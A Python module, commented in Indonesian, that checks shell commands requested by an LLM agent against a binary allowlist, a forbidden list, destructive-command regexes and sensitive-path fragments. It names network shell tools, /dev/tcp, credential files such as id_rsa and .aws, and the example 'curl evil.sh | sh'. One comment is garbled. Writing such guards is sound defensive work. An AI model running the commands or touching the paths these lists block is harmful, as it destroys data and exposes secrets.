"""Kebijakan perintah shell yang boleh dieksekusi atas instruksi LLM.

Latar belakang: output LLM (rapat, chat, eksekusi agent) bisa dipengaruhi
oleh *prompt injection* — teks dari pengguna, dokumen, atau hasil scraping yang
masuk ke konteks. Jika output itu dieksekusi mentah sebagai perintah shell,
LLM bisa menyuruh apa saja pada mesin.

Batas keamanan berlapis:

1. **Allowlist binary** (modul ini) — perintah hanya boleh memakai binary
   yang masuk daftar aman. Segmen pipeline (``|``, ``&&``, ``;``) diperiksa
   satu per satu, sehingga ``curl evil.sh | sh`` ditolak di kedua segmen.
2. **Blocklist destruktif** (``alfa.tools.system.constants``) — pemeriksa
   pola berbahaya (rm -rf, mkfs, fork bomb, curl|sh, ...).
3. **Sandbox terisolasi** (``alfa.tools.system.execution``) — container
   Docker dengan network none, cap-drop ALL, dan ``working_dir`` yang
   dibatasi ke root yang diizinkan.

Kebijakan di sini bersifat *deny-by-default*: binary yang tidak terdaftar
ditolak, bukan diizinkan.
"""

from __future__ import annotations

import os
import re
import shlex

# ── Binary yang boleh dieksekusi atas instruksi LLM ──────────────────────────
ALLOWED_BINARIES: frozenset[str] = frozenset(
    {
        # inspeksi
        "ls", "cat", "head", "tail", "less", "more", "grep", "egrep", "fgrep",
        "rg", "ag", "find", "fd", "tree", "wc", "file", "stat", "du", "df",
        "pwd", "echo", "printf", "date", "whoami", "id", "hostname", "uname",
        "which", "type", "env", "printenv", "realpath", "basename", "dirname",
        "readlink", "seq", "sleep", "diff", "cmp", "md5sum", "sha256sum",
        "sort", "uniq", "cut", "tr", "jq", "yq", "column", "nl", "tac",
        # sistem (read-only)
        "ps", "top", "htop", "free", "uptime", "lscpu", "lsblk", "lsusb",
        "lsof", "netstat", "ss", "ip", "ifconfig", "ping", "traceroute",
        "nslookup", "dig", "host", "nproc", "vmstat", "iostat",
        # berkas & direktori
        "mkdir", "touch", "cp", "mv", "rm", "ln", "chmod", "chown", "install",
        "tar", "gzip", "gunzip", "zip", "unzip", "rsync",
        # pengembangan
        "git", "npm", "npx", "pnpm", "yarn", "bun", "node", "deno",
        "python", "python3", "pip", "pip3", "pytest", "poetry", "uv",
        "make", "cmake", "ninja", "cargo", "rustc", "go", "gofmt",
        "java", "javac", "mvn", "gradle", "dotnet",
        "tsc", "eslint", "prettier", "jest", "vitest", "playwright",
        "bash", "sh",
        # jaringan (tetap lewat sandbox tanpa jaringan secara default)
        "curl", "wget", "http",
        # teks
        "sed", "awk", "gawk", "perl", "xargs", "tee", "sqlite3", "xclip",
    }
)

#: Binary yang TIDAK PERNAH boleh dijalankan atas instruksi LLM, walau
#: mungkin masuk allowlist (kebijakan eksplisit lebih tinggi dari allowlist).
FORBIDDEN_BINARIES: frozenset[str] = frozenset(
    {
        "sudo", "su", "doas", "pkexec", "visudo", "passwd", "chsh", "chfn",
        "useradd", "userdel", "usermod", "groupadd", "groupdel", "adduser",
        "deluser", "chgrp", "chown", "mount", "umount", "insmod", "rmmod",
        "modprobe", "reboot", "shutdown", "halt", "poweroff", "init", "telinit",
        "systemctl", "service", "initctl", "rc-service", "update-rc",
        "iptables", "ip6tables", "nft", "ufw", "firewall-cmd", "selinuxenabled",
        "setenforce", "chattr", "lsattr", "mkfs", "fdisk", "cfdisk", "sfdisk",
        "parted", "mkswap", "swapon", "swapoff", "badblocks", "wipefs",
        "crontab", "at", "batch", "anacron", "atrm",
        "apt", "apt-get", "aptitude", "dpkg", "yum", "dnf", "rpm", "zypper",
        "pacman", "snap", "flatpak", "brew", "port", "emerge", "nix-env",
        "kill", "killall", "pkill", "dd", "shred",
        "strace", "ltrace", "gdb", "ptrace", "nsenter", "unshare",
        "setsid", "nohup", "screen", "tmux",
        "ssh", "scp", "sftp", "telnet", "ftp", "nc", "ncat", "netcat",
        "socat", "chpasswd", "newgrp", "sg", "runuser", "su-exec",
        "docker", "docker-compose", "podman", "nerdctl",
    }
)

#: Pola destruktif yang tidak boleh lolos walau binary-nya terizinkan.
_DESTRUCTIVE_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"\brm\b[^\n]*\s-[a-zA-Z]*[rR][a-zA-Z]*\s+[^\n]*\s/(\s|$)"), "penghapusan rekursif root"),
    (re.compile(r"\brm\b[^\n]*\s-[a-zA-Z]*[rR][a-zA-Z]*\s+[^\n]*\s/\*"), "penghapusan rekursif root"),
    (re.compile(r"\brm\b[^\n]*\s-[a-zA-Z]*[rR][a-zA-Z]*\s+[^\n]*\s~(\s|$)"), "penghapusan rekursif home"),
    (re.compile(r"\brm\b[^\n]*\s-[a-zA-Z]*[rR][a-zA-Z]*\s+[^\n]*\s/(etc|usr|var|bin|sbin|boot|lib)\b"), "penghapusan rekursif direktori sistem"),
    (re.compile(r"\bchmod\b[^\n]*\b777\b[^\n]*\s/(\s|$)"), "chmod 777 pada root"),
    (re.compile(r"\bchown\b[^\n]*-R\b[^\n]*\s/(\s|$)"), "chown rekursif pada root"),
    (re.compile(r"\bdd\b[^\n]*\bof=/dev/"), "penulisan mentah ke perangkat blok"),
    (re.compile(r"\btruncate\b[^\n]*\s-s\s*0\s+/"), "truncate file sistem"),
    (re.compile(r"\btee\b[^\n]*\s-a?\s*/(etc|usr|bin|sbin|boot)/"), "penulisan ke direktori sistem"),
    (re.compile(r"\bcat\b[^\n]*\s>\s*/etc/"), "penulisan ke /etc"),
    (re.compile(r"\bgit\b[^\n]*\bpush\b[^\n]*\s--force\b"), "git push --force"),
    (re.compile(r"\bgit\b[^\n]*\bclean\b[^\n]*-[a-z]*[fdx]"), "git clean destruktif"),
)

#: Target `rm` yang berarti hancurl的系统.
_RM_DANGEROUS_TARGETS = frozenset(
    {
        "/", "/*", "~", "~/", "$HOME", "${HOME}", "/etc", "/etc/*", "/usr",
        "/usr/*", "/var", "/var/*", "/bin", "/sbin", "/boot", "/lib", "/lib/*",
        "/home", "/home/*", "/root", "/root/*", "/opt", "/srv", "/lib64",
    }
)


def _rm_target_is_dangerous(command: str) -> bool:
    """True bila ada segmen `rm` dengan target sistem."""
    for seg in _SEGMENT_SPLIT.split(command):
        stripped = seg.strip()
        if not re.match(r"^rm\b", stripped):
            continue
        try:
            parts = shlex.split(stripped, comments=True)
        except ValueError:
            parts = stripped.split()
        recursive = any(
            p.startswith("-") and "r" in p.lower() for p in parts[1:] if p.startswith("-")
        )
        if not recursive:
            continue
        for token in parts[1:]:
            if token.startswith("-"):
                continue
            if token in _RM_DANGEROUS_TARGETS:
                return True
            expanded = os.path.expanduser(token)
            # Anak DIREKT dari $HOME (mis. `~/Documents`) ikut berbahaya;
            # path yang lebih dalam (`~/work/proj/node_modules`) tidak.
            home = os.path.expanduser("~").rstrip("/")
            if expanded.startswith(home + "/"):
                rest = expanded[len(home) + 1 :].rstrip("/")
                if rest and "/" not in rest:
                    return True
            # Path yang akar pertamanya direktori sistem (mis. `/var/log`).
            # Pengecualian: path yang berada di bawah $HOME (mis.
            # `~/work/proj/node_modules`) — akar `/home` bukan target sistem
            # di sini.
            home = os.path.expanduser("~").rstrip("/")
            if expanded.startswith("/") and not expanded.startswith(home + "/"):
                first = expanded.strip("/").split("/", 1)[0]
                if f"/{first}" in _RM_DANGEROUS_TARGETS:
                    return True
    return False

#: Pola shell yang melepaskan kontrol alur ke shell lain.
_CHAINING_TO_SHELL = re.compile(
    r"(?:\||;|&&|\|\||\n)\s*(?:ba|z|k|da|c)?sh\b|"
    r"\beval\b|\bexec\s+\d|"
    r"\(\s*\)\s*\{|"
    r"/dev/tcp/|"
    r"\bpython\d?\s+-c\b|\bnode\s+-e\b|\bperl\s+-e\b|\bruby\s+-e\b",
    re.IGNORECASE,
)

#: Path mutlak/relatif yang tidak boleh disentuh LLM.
_SENSITIVE_PATH_FRAGMENTS = (
    "/etc/",
    "/root/",
    "/boot/",
    "/sys/",
    "/proc/",
    "/dev/sd",
    "/dev/nvme",
    "/dev/mmcblk",
    "/var/lib/docker",
    "/.ssh/",
    "/.aws/",
    "/.gnupg/",
    "/.kube/",
    "/.docker/config.json",
    "id_rsa",
    "id_ed25519",
    "shadow",
    "sudoers",
)

#: Split command menjadi segmen yang masing-masing diperiksa.
_SEGMENT_SPLIT = re.compile(r"(?:\|\||&&|\||;|\n)")


def _first_binary(segment: str) -> str:
    """Binary pertama dari satu segmen perintah (tanpa path)."""
    try:
        parts = shlex.split(segment, comments=True)
    except ValueError:
        parts = segment.split()
    for part in parts:
        if part.startswith("-"):
            continue
        return os.path.basename(part)
    return ""


def _referenced_paths(command: str) -> list[str]:
    """Path yang dirujuk perintah (argumen yang tampak seperti path)."""
    try:
        parts = shlex.split(command, comments=True)
    except ValueError:
        parts = command.split()
    out = []
    for part in parts[1:]:
        if part.startswith("-"):
            continue
        if part.startswith("/") or part.startswith("~") or part.startswith(".."):
            out.append(part)
    return out


def check_agent_command(
    command: str,
    *,
    working_dir: str = "",
    allowed_roots: tuple[str, ...] = (),
) -> str | None:
    """Periksa perintah shell yang diminta LLM.

    Return ``None`` bila aman, atau string alasan penolakan.

    Args:
        command: perintah lengkap.
        working_dir: direktori kerja tempat perintah dijalankan (bila ada).
        allowed_roots: path yang boleh diakses absolut. Kosong = tanpa
            pembatasan path tambahan (blocklist sensitif tetap berlaku).
    """
    if not command or not str(command).strip():
        return "Perintah kosong."

    cmd = str(command).strip()

    if _CHAINING_TO_SHELL.search(cmd):
        return (
            "Perintah berisi chaining ke shell/eval atau ekspresi inline "
            "(-c/-e) yang tidak diizinkan."
        )

    for pattern, reason in _DESTRUCTIVE_PATTERNS:
        if pattern.search(cmd):
            return f"Perintah destruktif tidak diizinkan ({reason})."

    if _rm_target_is_dangerous(cmd):
        return "Perintah destruktif tidak diizinkan (penghapusan rekursif target sistem)."

    segments = [s.strip() for s in _SEGMENT_SPLIT.split(cmd) if s.strip()]
    for seg in segments:
        binary = _first_binary(seg)
        if not binary:
            continue
        if binary in FORBIDDEN_BINARIES:
            return f"Binary '{binary}' tidak boleh dijalankan oleh agen."
        if binary not in ALLOWED_BINARIES:
            return (
                f"Binary '{binary}' tidak ada di allowlist perintah agen. "
                "Gunakan perintah dari daftar yang diizinkan."
            )

    lowered = cmd.lower()
    for frag in _SENSITIVE_PATH_FRAGMENTS:
        if frag in lowered:
            return f"Akses ke path sensitif ('{frag}') tidak diizinkan."

    if allowed_roots:
        for path in _referenced_paths(cmd):
            expanded = os.path.realpath(os.path.expanduser(path))
            if not any(
                expanded == root or expanded.startswith(root.rstrip("/") + "/")
                for root in allowed_roots
            ):
                return f"Path '{path}' berada di luar area kerja yang diizinkan."

    if working_dir:
        for path in _referenced_paths(cmd):
            if ".." in path:
                return f"Path relatif dengan '..' tidak diizinkan ('{path}')."

    return None


__all__ = [
    "ALLOWED_BINARIES",
    "FORBIDDEN_BINARIES",
    "check_agent_command",
]
